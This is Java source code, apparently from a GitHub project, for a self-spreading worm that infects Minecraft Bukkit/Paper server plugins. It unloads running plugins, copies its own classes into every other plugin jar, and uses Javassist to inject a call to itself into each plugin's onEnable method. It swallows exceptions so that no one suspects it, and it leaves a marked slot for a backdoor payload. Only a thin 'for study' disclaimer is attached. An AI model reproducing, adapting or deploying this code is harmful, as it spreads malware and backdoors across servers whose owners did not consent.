package baby;

import javassist.*;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.PluginCommand;
import org.bukkit.command.SimpleCommandMap;
import org.bukkit.event.Event;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.RegisteredListener;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

/**
 * This is a Worm Virus for Minecraft Plugins
 * used in order to protect your personal plugin.
 * SO PLEASE DO NOT USE IT FOR THE PURPOSES OF ILLEGAL THINGS
 * THESE CODE ONLY FOR JAVA STUDYING
 * Plugin manager code from <a href="https://github.com/Lenni0451/SpigotPluginManager">here</a>
 * All the exceptions should be ignored because it may make someone suspect.
 * @author commandf1
 */
@SuppressWarnings({"ResultOfMethodCallIgnored", "AlibabaAvoidManuallyCreateThread", "AlibabaClassNamingShouldBeCamel"})
public class Baby$0 {
    private static final String PAPER_LAUNCH_ENTRYPOINT_HANDLER = "io.papermc.paper.plugin.entrypoint.LaunchEntryPointHandler";

    private static final String PROPERTY_NAME = "babyGod";

    private final File plugins;

    public Baby$0(Plugin plugin) {
        // we need its data folder
        this.plugins = plugin.getDataFolder().getParentFile();

        // we only need one infected one to infect others
        if (hasOthersRunning()) {
            return;
        }

        markAsRunning();

        /*
        * You can do what you want here.
        * e.g. socket connection or a listener registration
        * */

        // START THE CODE

        /* If you don't have any ideas about that*/
        /* You can consider SuperBackDoor https://github.com/PreferMC/SuperBackdoor*/

        // END THE CODE

        // to infect the plugins
        new Thread(() -> {
            try {
                this.infectPlugins();
            } catch (IOException ignored) {
            }
        }).start();
    }

    private void infectPlugins() throws IOException {
        File[] jarFiles = this.plugins.listFiles((name) -> name.getName().toLowerCase().endsWith(".jar"));
        if (jarFiles == null) {
            return;
        }

        for (File jarFile : jarFiles) {
            try {
                if (hasInfected(new JarFile(jarFile))) {
                    continue;
                }

                this.processJarFile(jarFile);
            } catch (Exception ignored) {
            }
        }
    }

    private PluginDescriptionFile getPluginDescription(final File file) {
        try (JarFile jar = new JarFile(file)) {
            JarEntry entry = jar.getJarEntry("plugin.yml");
            if (entry == null) {
                return null;
            }

            try (InputStream is = jar.getInputStream(entry)) {
                return new PluginDescriptionFile(is);
            }
        } catch (Throwable t) {
            return null;
        }
    }

    private Plugin getPluginByFile(File file) {
        PluginDescriptionFile description = this.getPluginDescription(file);
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
            if (description != null && plugin.getDescription().getName().equals(description.getName())) {
                return plugin;
            }
        }

        return null;
    }

    private void processJarFile(File jarFile) throws InterruptedException {
        Plugin plugin = this.getPluginByFile(jarFile);
        String pluginName = plugin == null ? null : plugin.getName();

        /*
        * Windows will lock the files while they are running.
        * So we should unload it then to infect so.
        * */
        if (IS_WINDOWS) {
            Bukkit.getScheduler().cancelTasks(plugin);
            this.unloadPlugin(plugin);
        }

        while (true) {
            if (pluginName == null || Bukkit.getPluginManager().getPlugin(pluginName) == null) {
                break;
            }
        }

        Thread.sleep(1000);

        try (JarFile jar = new JarFile(jarFile)) {
            if (this.hasInfected(jar)) {
                return;
            }

            JarEntry pluginYmlEntry = jar.getJarEntry("plugin.yml");
            if (pluginYmlEntry == null) {
                return;
            }
            String mainClassName;
            try (InputStream input = jar.getInputStream(pluginYmlEntry)) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(input));
                mainClassName = getMainClassName(reader);

                if (mainClassName == null) {
                    return;
                }
            }

            /*
            * copy the files that we really need
            * */
            this.copyResources(jarFile, new String[] {"baby", "javassist"}, mainClassName);
        } catch (Exception ignored) {
        }
    }

    @SuppressWarnings("all")
    private void unloadPlugin(Plugin plugin) {
        Bukkit.getPluginManager().disablePlugin(plugin);
        List<Plugin> plugins = Collections.emptyList();
        Map<String, Plugin> lookupNames = Collections.emptyMap();
        SimpleCommandMap commandMap = null;
        Map<String, Command> knownCommands = Collections.emptyMap();
        Map<Event, SortedSet<RegisteredListener>> listeners;

        Object pluginContainer = Bukkit.getPluginManager();
        try {
            Field paperPluginManager = Bukkit.getServer().getClass().getDeclaredField("paperPluginManager");
            paperPluginManager.setAccessible(true);
            pluginContainer = paperPluginManager.get(Bukkit.getServer());
        } catch (Throwable ignored) {
        }
        try {
            Field instanceManager = pluginContainer.getClass().getDeclaredField("instanceManager");
            instanceManager.setAccessible(true);
            pluginContainer = instanceManager.get(pluginContainer);
        } catch (Throwable ignored) {
        }
        try { // Get plugins list
            Field f = pluginContainer.getClass().getDeclaredField("plugins");
            f.setAccessible(true);
            plugins = (List<Plugin>) f.get(pluginContainer);
        } catch (Throwable e) {
        }
        try { // Get lookup names
            Field f = pluginContainer.getClass().getDeclaredField("lookupNames");
            f.setAccessible(true);
            lookupNames = (Map<String, Plugin>) f.get(pluginContainer);
        } catch (Throwable e) {
        }
        try { // Get command map
            Field f = pluginContainer.getClass().getDeclaredField("commandMap");
            f.setAccessible(true);
            commandMap = (SimpleCommandMap) f.get(pluginContainer);
        } catch (Throwable e) {
        }
        try { // Get known commands
            Field f = SimpleCommandMap.class.getDeclaredField("knownCommands");
            f.setAccessible(true);
            knownCommands = (Map<String, Command>) f.get(commandMap);
        } catch (Throwable e) {
        }
        try {
            Field f = pluginContainer.getClass().getDeclaredField("listeners");
            f.setAccessible(true);
            listeners = (Map<Event, SortedSet<RegisteredListener>>) f.get(pluginContainer);
        } catch (Throwable e) {
            listeners = null;
        }

        plugins.remove(plugin);
        lookupNames.remove(plugin.getName());
        lookupNames.remove(plugin.getName().toLowerCase());
        { // Remove plugin commands
            Iterator<Map.Entry<String, Command>> iterator = knownCommands.entrySet().iterator();
            while (iterator.hasNext()) {
                Map.Entry<String, Command> entry = iterator.next();
                if (entry.getValue() instanceof PluginCommand) {
                    PluginCommand command = (PluginCommand) entry.getValue();
                    if (command.getPlugin().equals(plugin)) iterator.remove();
                }
            }
        }
        if (listeners != null) {
            for (Set<RegisteredListener> registeredListeners : listeners.values()) {
                registeredListeners.removeIf(registeredListener -> registeredListener.getPlugin().equals(plugin));
            }
        }
        try {
            Class<?> entryPointHandler = Class.forName(PAPER_LAUNCH_ENTRYPOINT_HANDLER);
            Object instance = entryPointHandler.getDeclaredField("INSTANCE").get(null);
            Map<?, ?> storage = (Map<?, ?>) instance.getClass().getMethod("getStorage").invoke(instance);
            for (Object providerStorage : storage.values()) {
                Iterable<?> providers = (Iterable<?>) providerStorage.getClass().getMethod("getRegisteredProviders").invoke(providerStorage);
                Iterator<?> it = providers.iterator();
                while (it.hasNext()) {
                    Object provider = it.next();
                    Object meta = provider.getClass().getMethod("getMeta").invoke(provider);
                    String metaName = (String) meta.getClass().getMethod("getName").invoke(meta);
                    if (metaName.equals(plugin.getName())) {
                        it.remove();
                    }
                }
            }
        } catch (Throwable e) {
        }

        if (plugin.getClass().getClassLoader() instanceof URLClassLoader) {
            URLClassLoader classLoader = (URLClassLoader) plugin.getClass().getClassLoader();

            try {
                classLoader.close();
            } catch (Throwable t) {
            }
        }

        try {
            Method syncCommands = Bukkit.getServer().getClass().getDeclaredMethod("syncCommands");
            syncCommands.setAccessible(true);
            syncCommands.invoke(Bukkit.getServer());
        } catch (Throwable e) {
        }
        System.gc();
    }

    private void copyResources(File target, String[] directoryName, String mainClass) throws Exception {
        File source = new File(this.getClass().getProtectionDomain().getCodeSource().getLocation().getPath());
        File tempFile = new File(target.getPath() + ".tmp");

        boolean hasWrittenMainClass = false;

        try (JarFile sourceJar = new JarFile(source);
             JarFile targetJar = new JarFile(target);
             JarOutputStream destinationJarOutputStream = new JarOutputStream(Files.newOutputStream(tempFile.toPath()))) {
            Set<JarEntry> entries = this.extractEntriesWithOuterDirectoryName(source, directoryName);
            for (JarEntry entry : entries) {
                destinationJarOutputStream.putNextEntry(entry);
                this.copyEntry(destinationJarOutputStream, entry, sourceJar);
            }

            Enumeration<JarEntry> originalEntries = targetJar.entries();

            while (originalEntries.hasMoreElements()) {
                JarEntry originalEntry = originalEntries.nextElement();
                String name = originalEntry.getName().substring(0, originalEntry.getName().length() - 6);
                if (!hasWrittenMainClass &&
                        originalEntry.getName().toLowerCase().endsWith(".class") && name.replace('/', '.').equals(mainClass)) {
                    ClassPool classPool = ClassPool.getDefault();
                    CtClass ctClass = classPool.makeClass(targetJar.getInputStream(originalEntry), false);
                    CtMethod onEnableMethod = ctClass.getDeclaredMethod("onEnable");
                    onEnableMethod.insertBefore("try {\n" +
                            "                                        java.lang.Class clazz = Class.forName(\"baby.Baby$0\");" +
                            "            java.lang.reflect.Constructor constructor = clazz.getConstructors()[0];\n" +
                            "            Object[] objects = new Object[] { this };\n" +
                            "            constructor.newInstance(objects);\n" +
                            "        } catch (Exception ignored) {\n" +
                            "        }");
                    byte[] newClassBytes = ctClass.toBytecode();
                    JarEntry newEntry = new JarEntry(originalEntry.getName());
                    destinationJarOutputStream.putNextEntry(newEntry);
                    destinationJarOutputStream.write(newClassBytes);
                    hasWrittenMainClass = true;
                } else {
                    destinationJarOutputStream.putNextEntry(originalEntry);
                    this.copyEntry(destinationJarOutputStream, originalEntry, targetJar);
                }
            }
        }

        new Thread(() -> {
            try {
                Thread.sleep(100);
                Files.deleteIfExists(target.toPath());
                tempFile.renameTo(target);
            } catch (Exception ignored) {
            }
        }).start();
    }

    private void copyEntry(JarOutputStream outputStream, JarEntry entry, JarFile source) throws IOException {
        try (InputStream input = source.getInputStream(entry)) {
            int bytesRead;
            byte[] buffer = new byte[1024];
            while ((bytesRead = input.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
        }
    }

    private Set<JarEntry> extractEntriesWithOuterDirectoryName(File jar, String[] directoryNames) {
        Set<JarEntry> entries = new HashSet<>();
        try (JarFile jarFile = new JarFile(jar)) {
            Enumeration<JarEntry> entriesEnum = jarFile.entries();
            while (entriesEnum.hasMoreElements()) {
                JarEntry entry = entriesEnum.nextElement();
                String entryName = entry.getName();

                for (String directoryName : directoryNames) {
                    if (entryName.startsWith(directoryName + "/")) {
                        entries.add(entry);
                    }
                }
            }
        } catch (IOException ignored) {
        }
        return entries;
    }

    private boolean hasInfected(JarFile jar) {
        return containsDir(jar, "baby");
    }

    @SuppressWarnings("SameParameterValue")
    private boolean containsDir(JarFile jar, String dirName) {
        Enumeration<JarEntry> entries = jar.entries();
        while (entries.hasMoreElements()) {
            JarEntry entry = entries.nextElement();
            if (entry.getName().startsWith(dirName + "/") && !entry.isDirectory()) {
                return true;
            }
        }
        return false;
    }

    private static final boolean IS_WINDOWS;

    static {
        IS_WINDOWS = System.getProperty("os.name").toLowerCase().contains("windows");
    }

    private String strip(String string) {
        if (string == null) {
            return null;
        }

        // 使用正则表达式匹配两端的空白字符并替换为空字符串
        return string.replaceAll("^\\s+|\\s+$", "");
    }

    private String getMainClassName(BufferedReader reader) throws IOException {
        String line;
        while ((line = reader.readLine()) != null) {
            if (line.contains("main: ")) {
                return this.strip(line.split(":")[1])
                        .replaceFirst("^ \"", "")
                        .replaceFirst(" \"$", "");
            }
        }

        return null;
    }

    private boolean hasOthersRunning() {
        return System.getProperty(PROPERTY_NAME) != null;
    }

    private void markAsRunning() {
        System.setProperty(PROPERTY_NAME, "true");
    }
}
